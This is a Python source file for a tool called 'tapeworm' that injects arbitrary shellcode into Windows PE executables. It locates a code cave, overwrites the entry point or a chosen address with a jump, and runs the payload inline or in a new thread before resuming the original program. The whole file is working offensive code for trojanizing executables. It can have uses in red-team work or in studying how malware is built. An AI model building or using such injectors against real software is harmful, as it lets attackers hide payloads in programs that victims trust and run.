#!/usr/bin/env python3

import pefile
import argparse
from pwn import *


def log_info(msg):
    print('[+] {}'.format(msg))


def log_details(msg):
    print(' |    {}'.format(msg))


class Args:
    def __init__(self):
        parser = argparse.ArgumentParser(
            description='tapeworm - shellcode injector', prog='tapeworm')
        required = parser.add_argument_group('required named arguments')
        required.add_argument(
            '-p', '--payload', help='shellcode file', required=True)
        required.add_argument(
            '-i', '--input', help='input PE path', required=True)
        required.add_argument(
            '-o', '--output', help='output PE path ', required=True)

        uct_help = ('Run the shellcode in a new thread. '
                    'Tapeworm will inject an additional shellcode that will run CreateThread. '
                    'The created thread will run your shellcode immediately')
        parser.add_argument('-t', '--use-create-thread',
                            action='store_true', help=uct_help)

        ia_help = ('RVA where the jump to the shellcode should be injected. '
                   'If not specified the entry point of the PE will be used.')
        parser.add_argument('-a', '--injection-address', help=ia_help)

        ec_help = ('Move the code cave start address EXTEND_CAVE bytes back. '
                   'This will result in EXTEND_CAVE last bytes of instructions in .text to be overwritten! '
                   'You may want to try this if the code cave is too small for your shellcode, but it will make the main program break at some unexpected point.')
        parser.add_argument('-e', '--extend-cave', help=ec_help)
        self.args = parser.parse_args()

    def shellcode_file(self):
        return self.args.payload

    def source_pe(self):
        return self.args.input

    def target_pe(self):
        return self.args.output

    def use_create_thread(self):
        return self.args.use_create_thread

    def extend_cave_by(self):
        ec = self.args.extend_cave
        if ec is None:
            return None
        return int(ec)

    def injection_address(self):
        try:
            return int(self.args.injection_address, 16)
        except:
            return None


class Address:
    def __init__(self, pe, va=None, ava=None, raw=None):
        image_base = pe.OPTIONAL_HEADER.ImageBase
        self.pe = pe

        if raw != None:
            va = pe.get_rva_from_offset(raw)

        if va != None:
            self.va = va
        else:
            self.va = ava - image_base
        self.ava = self.va + image_base

    def __add__(self, other):
        return Address(self.pe, self.va + other, self.ava + other)

    def __sub__(self, other):
        return Address(self.pe, self.va - other, self.ava - other)

    def clone(self):
        return Address(self.pe, self.va, self.ava)

    def file_offset(self):
        return pe.get_offset_from_rva(self.va)


class AddressRange:
    def __init__(self, start: Address, end: Address):
        self.start = start
        self.end = end

    def length(self):
        return self.end.va - self.start.va


class Instruction:
    def __init__(self, pe, pwnlib_disasm_line):
        self.address = Address(pe, va=int(
            pwnlib_disasm_line.split(':')[0].strip(), 16))

        without_address = pwnlib_disasm_line.split(':')[1].strip()
        self.bytes = bytes.fromhex(without_address.split('  ')[0])
        self.len = len(self.bytes)

        self.menmonic = disasm(self.bytes, offset=False, byte=False)


def is_64bit(pe: pefile.PE):
    return 0x8664 == pe.FILE_HEADER.Machine


def print_pe_info(pe: pefile.PE, args: Args):
    image_base = pe.OPTIONAL_HEADER.ImageBase
    ep = Address(pe, pe.OPTIONAL_HEADER.AddressOfEntryPoint)
    log_details(f'Image base: {image_base:X}')
    log_details(f'Entry point virtual address: {ep.ava:X}')
    ip = Address(pe, args.injection_address()
                 ) if args.injection_address() else ep
    log_details(f'Injection point: {ip.ava:X}')
    arch = '64bit' if is_64bit(pe) else '32bit'
    log_details(f'Arch: {arch}')


def find_code_cave(pe: pefile.PE):
    raw_end = pe.sections[0].PointerToRawData + \
        pe.sections[0].SizeOfRawData - 1
    raw_start = raw_end
    while pe.get_word_from_offset(raw_start) & 0xff == 0:
        raw_start -= 1
    raw_start += 1
    return AddressRange(Address(pe, raw=raw_start), Address(pe, raw=raw_end))


def find_instructions_to_replace(pe: pefile.PE, start_addr, min_len):
    data = pe.get_memory_mapped_image()[start_addr.va:start_addr.va+min_len+20]
    instructions = []
    total_len = 0

    disassembled = disasm(data, vma=start_addr.va)
    for l in disassembled.split('\n'):
        instruction = Instruction(pe, l)
        instructions.append(instruction)
        total_len += instruction.len
        if total_len > min_len:
            break

    return instructions


def put_jmp_to_text(pe: pefile.PE, cave: AddressRange, additional_offset=0, injection_point_va=None):
    """Put jmp at injection point (entry point by default) and return a list of instructions that were replaced"""
    if injection_point_va == None:
        injection_point_va = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    injection_point = Address(pe, injection_point_va)

    offset = cave.start.va - injection_point.va + additional_offset
    jmp_instr = asm(f'jmp .+0x{offset:X}')

    instructions = find_instructions_to_replace(
        pe, injection_point, len(jmp_instr))

    instructions_len = sum([i.len for i in instructions])
    nop_padding_len = instructions_len - len(jmp_instr)
    nop_padding = nop_padding_len * b'\x90'
    pe.set_bytes_at_rva(injection_point.va, jmp_instr+nop_padding)

    return instructions


def save_registers_and_flags_32bit():
    result = b''
    result += asm('pushad')
    result += asm('pushfd')
    return result


def save_registers_and_flags_64bit():
    result = b''
    result += asm('push r15')
    result += asm('push r8')
    result += asm('push r9')
    result += asm('push rax')
    result += asm('push rbx')
    result += asm('push rcx')
    result += asm('push rdi')
    result += asm('push rdx')
    result += asm('push rsi')
    result += asm('pushfq')
    return result


def restore_registers_and_flags_32bit():
    result = b''
    result += asm('popfd')
    result += asm('popad')
    return result


def restore_registers_and_flags_64bit():
    result = b''
    result += asm('popfq')
    result += asm('pop rsi')
    result += asm('pop rdx')
    result += asm('pop rdi')
    result += asm('pop rcx')
    result += asm('pop rbx')
    result += asm('pop rax')
    result += asm('pop r9')
    result += asm('pop r8')
    result += asm('pop r15')
    return result


def restore_registers_and_flags(pe: pefile.PE):
    if is_64bit(pe):
        return restore_registers_and_flags_64bit()
    else:
        return restore_registers_and_flags_32bit()


def make_shellcode_prolog(is_64bit):
    prolog = b''
    prolog += save_registers_and_flags_64bit() if is_64bit else save_registers_and_flags_32bit()
    return prolog


def write_to_cave(pe: pefile.PE, data: bytes, cave: AddressRange):
    if len(data) > cave.length():
        print(
            f'Code cave ({cave.length()}) too smol for your shellcode ({len(data)}) :(((((((')
        diff = len(data) - cave.length() + 1
        print(
            f'You can try to extend the cave (re-run with --extend-cave {diff})')
        print('Note that this will overwrite some instructions at the end of the .text section and may break the program!')
        exit(1)
    pe.set_bytes_at_rva(cave.start.va, data)


def put_shellcode_to_cave(pe: pefile.PE, shellcode, cave: AddressRange, replaced_instructions):
    prolog = make_shellcode_prolog(is_64bit(pe))

    epilog = b''
    epilog += restore_registers_and_flags(pe)
    # restore instructions
    for i in replaced_instructions:
        epilog += i.bytes
    # jump back after replaced instructions
    jmp_to_addr = replaced_instructions[-1].address.va + \
        replaced_instructions[-1].len
    jmp_instr_addr = cave.start.va + len(prolog+shellcode+epilog)
    offset = jmp_instr_addr - jmp_to_addr
    epilog += asm(f'jmp .-0x{offset:X}')

    full = prolog + shellcode + epilog
    write_to_cave(pe, full, cave)


def compile_create_thread(thread_start_addr, is_64bit=False, current_inst_rva=None):
    def remove_comments(txt):
        return re.sub(';.*$', '', txt, flags=re.MULTILINE)

    asm_file = 'create_thread_64.s' if is_64bit else 'create_thread.s'
    with open(asm_file) as f:
        code = remove_comments(f.read()).replace(
            ':CODE_CAVE_ADDR:', f'0x{thread_start_addr:X}')
        if current_inst_rva:
            code = code.replace(':FIRST_INSTR_ADDR:',
                                f'0x{current_inst_rva:X}')
        return asm(code)


def put_shellcode_to_cave_with_create_thread(pe: pefile.PE, shellcode, cave: AddressRange, replaced_instructions):
    # in this version we will put `shellcode|prolog|create_thread_shellcode|epilog`
    # to the cave. We need to jump to prolog, and create thread will run 'shellcode' in a new thread.
    prolog = make_shellcode_prolog(is_64bit(pe))

    current_inst_rva = cave.start.va + len(shellcode) + len(prolog)
    create_thread_shellcode = compile_create_thread(
        cave.start.va, is_64bit=is_64bit(pe), current_inst_rva=current_inst_rva)

    epilog = b''
    epilog += restore_registers_and_flags(pe)
    # restore instructions
    for i in replaced_instructions:
        epilog += i.bytes
    # jump back after replaced instructions
    jmp_to_addr = replaced_instructions[-1].address.va + \
        replaced_instructions[-1].len
    jmp_instr_addr = cave.start.va + \
        len(shellcode+prolog+create_thread_shellcode+epilog)
    offset = jmp_instr_addr - jmp_to_addr
    epilog += asm(f'jmp .-0x{offset:X}')

    full = shellcode + prolog + create_thread_shellcode + epilog
    write_to_cave(pe, full, cave)


if __name__ == '__main__':
    # >setup
    args = Args()
    log_info(f'Parsing {args.source_pe()} and reading the shellcode')
    pe = pefile.PE(args.source_pe(), fast_load=False)

    with open(args.shellcode_file(), 'rb') as f:
        shellcode = f.read()

    arch = 'amd64' if is_64bit(pe) else 'i386'
    context.update(arch=arch)
    # <setup

    print_pe_info(pe, args)

    print('')
    log_info('Looking for the code cave')
    cave = find_code_cave(pe)

    log_details(f'Cave: {cave.start.ava:X} - {cave.end.ava:X}')

    if args.extend_cave_by():
        cave.start = Address(pe, cave.start.va - args.extend_cave_by())
        log_details(f'Extended cave: {cave.start.ava:X} - {cave.end.ava:X}')

    log_details(
        f'File offsets: {cave.start.file_offset():X} - {cave.end.file_offset():X}')
    log_details(f'Length: {cave.length()} bytes')

    print('')
    if args.injection_address():
        log_info(
            f'Writing jmp instruction to {Address(pe, args.injection_address()).ava:X}')
    else:
        log_info('Writing jmp instruction to entry point')

    if args.use_create_thread():
        # we need to jump to our create_thread shellcode which is after the provided shellcode
        additional_offset = len(shellcode)
        replaced_instructions = put_jmp_to_text(
            pe, cave, additional_offset=additional_offset, injection_point_va=args.injection_address())
    else:
        replaced_instructions = put_jmp_to_text(
            pe, cave, injection_point_va=args.injection_address())

    print('')
    log_info('Writing the shellcode to code cave')
    if args.use_create_thread():
        put_shellcode_to_cave_with_create_thread(
            pe, shellcode, cave, replaced_instructions)
    else:
        put_shellcode_to_cave(pe, shellcode, cave, replaced_instructions)

    # end
    log_info(f'Storing changes in {args.target_pe()}')
    pe.write(args.target_pe())
